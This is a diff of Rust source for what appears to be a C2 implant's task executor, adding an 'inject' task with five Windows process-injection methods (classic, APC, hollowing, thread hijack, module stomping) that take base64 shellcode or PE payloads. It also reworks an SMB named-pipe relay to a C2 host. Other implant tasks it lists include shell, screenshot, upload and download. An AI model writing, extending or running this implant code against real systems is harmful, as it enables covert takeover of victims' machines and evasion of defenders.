@@ -1,11 +1,8 @@
 //! Task executor — dispatches tasks to their handlers and returns output.
 //!
-//! Each task type is a string identifier. The executor matches on type and
-//! calls the appropriate handler. Handlers return TaskOutput.
-//!
-//! Phase 1 tasks: "shell", "sleep"
-//! Phase 2 tasks: "kill", "screenshot", "upload", "download", "relay_start", "relay_stop"
-//! Phase 3 tasks: "module" (loads a PIC blob or BOF)
+//! Phase 1: "shell", "sleep"
+//! Phase 2: "kill", "screenshot", "upload", "download", "relay_start", "relay_stop"
+//! Phase 3: "inject" (shellcode/PE injection via classic/apc/hollow/hijack/stomp)
 
 use crate::task::{Task, TaskOutput};
 
@@ -19,6 +16,7 @@ pub fn run(task: &Task) -> TaskOutput {
         "download"     => exec_download(task),
         "relay_start"  => exec_relay_start(task),
         "relay_stop"   => exec_relay_stop(task),
+        "inject"       => exec_inject(task),
         other          => TaskOutput::failure(&format!("unknown task type: {other}")),
     }
 }
@@ -194,12 +192,12 @@ fn exec_relay_stop(_task: &Task) -> TaskOutput {
 fn smb_relay_loop(pipe_name: String, c2_host: String, c2_port: String, reg_path: String, poll_path: String) {
     use std::ffi::CString;
     use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
-    use windows_sys::Win32::Storage::FileSystem::{ReadFile, WriteFile};
     use windows_sys::Win32::System::Pipes::{
         ConnectNamedPipe, CreateNamedPipeA, DisconnectNamedPipe,
-        PIPE_ACCESS_DUPLEX, PIPE_READMODE_BYTE, PIPE_TYPE_BYTE, PIPE_WAIT,
+        PIPE_READMODE_BYTE, PIPE_TYPE_BYTE, PIPE_WAIT,
     };
-    use std::io::Read;
+    // PIPE_ACCESS_DUPLEX = 3 (FILE_PIPE_FULL_DUPLEX) — removed from windows-sys 0.52
+    const PIPE_ACCESS_DUPLEX: u32 = 3;
 
     let cpath = match CString::new(format!("\\\\.\\pipe\\{}", pipe_name)) {
         Ok(c) => c,
@@ -345,6 +343,139 @@ fn forward_http(url: &str, method: &str, body: &[u8]) -> Result<Vec<u8>, String>
     let mut buf = Vec::new();
     resp.into_reader().read_to_end(&mut buf).map_err(|e| e.to_string())?;
     Ok(buf)
+}
+
+// ---------------------------------------------------------------------------
+// Process injection (Phase 3)
+// ---------------------------------------------------------------------------
+//
+// Dispatch table for the "inject" task type.
+//
+// Task args JSON:
+//   classic:  {"method":"classic",  "pid":<u32>,  "shellcode":"<b64>"}
+//   apc:      {"method":"apc",      "target":"<exe path>", "shellcode":"<b64>"}
+//   hollow:   {"method":"hollow",   "target":"<exe path>", "payload":"<b64 PE>"}
+//   hijack:   {"method":"hijack",   "pid":<u32>,  "shellcode":"<b64>"}
+//   stomp:    {"method":"stomp",    "module":"<dll name>", "shellcode":"<b64>"}
+
+fn exec_inject(task: &Task) -> TaskOutput {
+    #[cfg(target_os = "windows")]
+    {
+        use crate::inject::{
+            inject_classic, inject_apc, inject_hollow, inject_hijack, inject_stomp,
+            shellcode_from_b64,
+        };
+
+        let args = match task.args.as_deref() {
+            Some(a) => a,
+            None => return TaskOutput::failure("inject: no args"),
+        };
+        let v: serde_json::Value = match serde_json::from_slice(args) {
+            Ok(v)  => v,
+            Err(e) => return TaskOutput::failure(&format!("inject: invalid args: {e}")),
+        };
+
+        let method = match v.get("method").and_then(|m| m.as_str()) {
+            Some(m) => m,
+            None    => return TaskOutput::failure("inject: missing method"),
+        };
+
+        match method {
+            "classic" => {
+                let pid = match v.get("pid").and_then(|p| p.as_u64()) {
+                    Some(p) => p as u32,
+                    None    => return TaskOutput::failure("inject/classic: missing pid"),
+                };
+                let sc_b64 = match v.get("shellcode").and_then(|s| s.as_str()) {
+                    Some(s) => s,
+                    None    => return TaskOutput::failure("inject/classic: missing shellcode"),
+                };
+                let sc = match shellcode_from_b64(sc_b64) {
+                    Some(s) => s,
+                    None    => return TaskOutput::failure("inject/classic: invalid base64"),
+                };
+                match inject_classic(pid, &sc) {
+                    Ok(())  => TaskOutput::success(b"injected".to_vec()),
+                    Err(e)  => TaskOutput::failure(&format!("inject/classic: {e}")),
+                }
+            }
+            "apc" => {
+                let target = match v.get("target").and_then(|t| t.as_str()) {
+                    Some(t) => t.to_string(),
+                    None    => return TaskOutput::failure("inject/apc: missing target"),
+                };
+                let sc_b64 = match v.get("shellcode").and_then(|s| s.as_str()) {
+                    Some(s) => s,
+                    None    => return TaskOutput::failure("inject/apc: missing shellcode"),
+                };
+                let sc = match shellcode_from_b64(sc_b64) {
+                    Some(s) => s,
+                    None    => return TaskOutput::failure("inject/apc: invalid base64"),
+                };
+                match inject_apc(&target, &sc) {
+                    Ok(())  => TaskOutput::success(b"injected".to_vec()),
+                    Err(e)  => TaskOutput::failure(&format!("inject/apc: {e}")),
+                }
+            }
+            "hollow" => {
+                let target = match v.get("target").and_then(|t| t.as_str()) {
+                    Some(t) => t.to_string(),
+                    None    => return TaskOutput::failure("inject/hollow: missing target"),
+                };
+                let payload_b64 = match v.get("payload").and_then(|p| p.as_str()) {
+                    Some(p) => p,
+                    None    => return TaskOutput::failure("inject/hollow: missing payload"),
+                };
+                let payload = match shellcode_from_b64(payload_b64) {
+                    Some(p) => p,
+                    None    => return TaskOutput::failure("inject/hollow: invalid base64"),
+                };
+                match inject_hollow(&target, &payload) {
+                    Ok(())  => TaskOutput::success(b"hollowed".to_vec()),
+                    Err(e)  => TaskOutput::failure(&format!("inject/hollow: {e}")),
+                }
+            }
+            "hijack" => {
+                let pid = match v.get("pid").and_then(|p| p.as_u64()) {
+                    Some(p) => p as u32,
+                    None    => return TaskOutput::failure("inject/hijack: missing pid"),
+                };
+                let sc_b64 = match v.get("shellcode").and_then(|s| s.as_str()) {
+                    Some(s) => s,
+                    None    => return TaskOutput::failure("inject/hijack: missing shellcode"),
+                };
+                let sc = match shellcode_from_b64(sc_b64) {
+                    Some(s) => s,
+                    None    => return TaskOutput::failure("inject/hijack: invalid base64"),
+                };
+                match inject_hijack(pid, &sc) {
+                    Ok(())  => TaskOutput::success(b"hijacked".to_vec()),
+                    Err(e)  => TaskOutput::failure(&format!("inject/hijack: {e}")),
+                }
+            }
+            "stomp" => {
+                let module = match v.get("module").and_then(|m| m.as_str()) {
+                    Some(m) => m.to_string(),
+                    None    => return TaskOutput::failure("inject/stomp: missing module"),
+                };
+                let sc_b64 = match v.get("shellcode").and_then(|s| s.as_str()) {
+                    Some(s) => s,
+                    None    => return TaskOutput::failure("inject/stomp: missing shellcode"),
+                };
+                let sc = match shellcode_from_b64(sc_b64) {
+                    Some(s) => s,
+                    None    => return TaskOutput::failure("inject/stomp: invalid base64"),
+                };
+                match inject_stomp(&module, &sc) {
+                    Ok(())  => TaskOutput::success(b"stomped".to_vec()),
+                    Err(e)  => TaskOutput::failure(&format!("inject/stomp: {e}")),
+                }
+            }
+            other => TaskOutput::failure(&format!("inject: unknown method: {other}")),
+        }
+    }
+    #[cfg(not(target_os = "windows"))]
+    TaskOutput::failure("inject: only supported on Windows")
 }
 
 // ---------------------------------------------------------------------------
